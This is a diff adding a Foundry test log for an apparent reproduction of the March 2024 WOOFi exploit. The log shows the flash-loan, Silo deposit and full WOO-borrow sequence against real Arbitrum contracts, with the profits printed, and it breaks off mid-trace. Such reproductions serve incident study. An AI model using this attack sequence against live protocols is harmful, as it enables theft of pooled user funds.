@@ -1,0 +1,584 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2024-03/Woofi_exp.sol:Woofi_exp
+[PASS] testExploit() (gas: 1256081)
+Logs:
+  USDCe after hack: 141603536376
+  WOO after hack: 2549710367944099228835575
+  WETH after hack: 522295261244159469020
+
+Traces:
+  [1369281] Attacker::testExploit()
+    ├─ [34702] WOO::approve(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [2337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   ├─ [24562] 0x3f770Ac673856F105b586bb393d122721265aD46::approve(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [25702] WOO::approve(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   ├─ [24562] 0x3f770Ac673856F105b586bb393d122721265aD46::approve(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [38439] USDCe::approve(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [31193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [27939] USDCe::approve(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [3296] USDCe::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   └─ ← [Return] 10586446576012 [1.058e13]
+    │   └─ ← [Return] 10586446576012 [1.058e13]
+    ├─ [1196016] Univ3pool::flash(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 10576446576012 [1.057e13], 0x00)
+    │   ├─ [9796] WETH::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 432042397152000341752 [4.32e20]
+    │   │   └─ ← [Return] 432042397152000341752 [4.32e20]
+    │   ├─ [1296] USDCe::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 10586446576012 [1.058e13]
+    │   │   └─ ← [Return] 10586446576012 [1.058e13]
+    │   ├─ [31397] USDCe::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10576446576012 [1.057e13])
+    │   │   ├─ [30651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10576446576012 [1.057e13]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10576446576012 [1.057e13])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [1126206] Attacker::uniswapV3FlashCallback(0, 5288223289 [5.288e9], 0x00)
+    │   │   ├─ [3296] WETH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [1296] USDCe::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 10576446576012 [1.057e13]
+    │   │   │   └─ ← [Return] 10576446576012 [1.057e13]
+    │   │   ├─ [3602] WOO::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [staticcall]
+    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   ├─ [2465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 2704558014737261187877837 [2.704e24]
+    │   │   │   └─ ← [Return] 2704558014737261187877837 [2.704e24]
+    │   │   ├─ [1085383] LBT::flashLoan(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000000000000000000000023cb6623e110c5808cb69, 0x000000000000000000000000000000000000000000023cb6623e110c5808cb690000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [1082662] 0xee5A90098b270596Ec35D637b30d908C862c86df::ea3446bf(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000023cb6623e110c5808cb6900000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000023cb6623e110c5808cb690000000000000000000000000000000000000000000000000000000000000000cafcd85d8ca7ad1e1c6f82f651fa15e33aefd07b82af49447d8a07e3bd95bd0d56f35241523fbab10019002c) [delegatecall]
+    │   │   │   │   ├─ [2402] 0x8e42f2F4101563bF679975178e880FD87d3eFd4e::getFlashLoanFee() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000048c27395000
+    │   │   │   │   ├─ [29227] WOO::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2704558014737261187877737 [2.704e24])
+    │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   ├─ [28087] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2704558014737261187877737 [2.704e24]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: LBT: [0xB87495219C432fc85161e4283DfF131692A528BD], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2704558014737261187877737 [2.704e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1009026] Attacker::LBFlashLoanCallback(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 0x000000000000000000000000000000000000000000023cb6623e110c5808cb69, 0x000000000000000000000000000000000000000000000000bbaa99ecda402c94, 0x000000000000000000000000000000000000000000023cb6623e110c5808cb690000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [259034] Silo::deposit(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 7000000000000 [7e12], true)
+    │   │   │   │   │   │   ├─ [7301] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::isSiloPaused(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [2872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [40794] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRateAndUpdate(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 1709653326 [1.709e9])
+    │   │   │   │   │   │   │   ├─ [5163] Silo::utilizationData(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000b79aa45c9c0000000000000000000000000000000000000000000000000000006e40194ac70000000000000000000000000000000000000000000000000000000065e73d18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000017f0a76247
+    │   │   │   │   │   │   ├─ [2439] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::protocolShareFee() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000003782dace9d90000
+    │   │   │   │   │   │   ├─ [2579] 0xDa3abf6F119E2D573e9a56E9679c0f87D4547799::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2349] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [56995] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::mint(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ [305] Silo::siloRepository() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008658047e48cc09161f4152c79155dac1d710ff0a
+    │   │   │   │   │   │   │   ├─ [2642] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getNotificationReceiver(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d592f705bdc8c1b439bd4d665ed99c4faad5a680
+    │   │   │   │   │   │   │   ├─ [2767] 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680::onAfterTransfer(0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124, 0x0000000000000000000000000000000000000000, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000 [7e12])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit NotificationSent(param0: 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680, param1: true)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [12463] USDCe::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ [11711] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 7000000000000 [7e12]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 7000000000000 [7e12])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 115792089237316195423570985008687907853269984665640564039457584000913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Deposit(param0: USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], param1: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 7000000000000 [7e12], param3: true)
+    │   │   │   │   │   │   ├─ [2426] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::priceProvidersRepository() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005bf4e67127263d951fc515e23b323d0e3b4485fd
+    │   │   │   │   │   │   ├─ [2718] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getMaxSiloDepositsValue(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   │   ├─ [3121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [51319] 0x5bf4E67127263D951FC515E23B323d0e3b4485fd::getPrice(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [45606] 0x9d0DDE842801448534263FF23C629EDC6B6B31ee::getPrice(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [15643] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [7410] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 4688, 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 4688
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073709556304 [1.844e19], 99997820 [9.999e7], 1709641592 [1.709e9], 1709641592 [1.709e9], 18446744073709556304 [1.844e19]
+    │   │   │   │   │   │   │   │   ├─ [15643] 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [7410] 0x3607e46698d218B3a5Cae44bF381475C0a5e2ca7::latestRoundData() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 531576 [5.315e5], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 531576 [5.315e5]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18446744073710083192 [1.844e19], 380824500000 [3.808e11], 1709653291 [1.709e9], 1709653291 [1.709e9], 18446744073710083192 [1.844e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 262582423137166 [2.625e14]
+    │   │   │   │   │   │   │   └─ ← [Return] 262582423137166 [2.625e14]
+    │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12], 7000000000000 [7e12]
+    │   │   │   │   │   ├─ [6662] Silo::liquidity(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   ├─ [3602] WOO::balanceOf(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [2465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262435 [5.092e24]
+    │   │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262435 [5.092e24]
+    │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262435 [5.092e24]
+    │   │   │   │   │   ├─ [357564] Silo::borrow(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 5092663209802375827262435 [5.092e24])
+    │   │   │   │   │   │   ├─ [3301] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::isSiloPaused(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [2872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [40011] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRateAndUpdate(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 1709653326 [1.709e9])
+    │   │   │   │   │   │   │   ├─ [5163] Silo::utilizationData(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000004534843933fb26b61c915000000000000000000000000000000000000000000001cdec982cabf0f6596860000000000000000000000000000000000000000000000000000000065e5fa6d
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000012a5700b61fd
+    │   │   │   │   │   │   ├─ [439] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::protocolShareFee() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000003782dace9d90000
+    │   │   │   │   │   │   ├─ [2579] 0x1d7000d36115dd2116f2401024583b973CaA0D54::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2579] 0x8B94112a3B5669B176015A38C19383a8C0B0c69A::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [1602] WOO::balanceOf(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262435 [5.092e24]
+    │   │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262435 [5.092e24]
+    │   │   │   │   │   │   ├─ [413] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::entryFee() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [2349] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 136104211261921156804284 [1.361e23]
+    │   │   │   │   │   │   ├─ [35483] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::mint(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   ├─ [305] Silo::siloRepository() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008658047e48cc09161f4152c79155dac1d710ff0a
+    │   │   │   │   │   │   │   ├─ [642] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getNotificationReceiver(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d592f705bdc8c1b439bd4d665ed99c4faad5a680
+    │   │   │   │   │   │   │   ├─ [2767] 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680::onAfterTransfer(0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D, 0x0000000000000000000000000000000000000000, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit NotificationSent(param0: 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680, param1: true)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ emit Borrow(param0: WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], param1: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 5092663209802375827262435 [5.092e24])
+    │   │   │   │   │   │   ├─ [7327] WOO::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5092663209802375827262435 [5.092e24])
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [6187] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5092663209802375827262435 [5.092e24]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5092663209802375827262435 [5.092e24])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [14368] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000004534860aaf68cfd315ac7000000000000000000000000000000000000000000045348c3b4110f5b2de4ab0000000000000000000000000000000000000000000000000000000065e73d4e
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 5083902323623058456015968 [5.083e24]
+    │   │   │   │   │   │   ├─ [349] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 5220006534884979612820252 [5.22e24]
+    │   │   │   │   │   │   ├─ [2872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [34885] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [3163] Silo::utilizationData(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000002a186545fb83e163f000000000000000000000000000000000000000000000000012de6cdf88fc86a0000000000000000000000000000000000000000000000000000000065e6a597
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000293e09aa9f
+    │   │   │   │   │   │   ├─ [2579] 0xf13a33bd14D05B869B8f97095b63cae84d573852::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
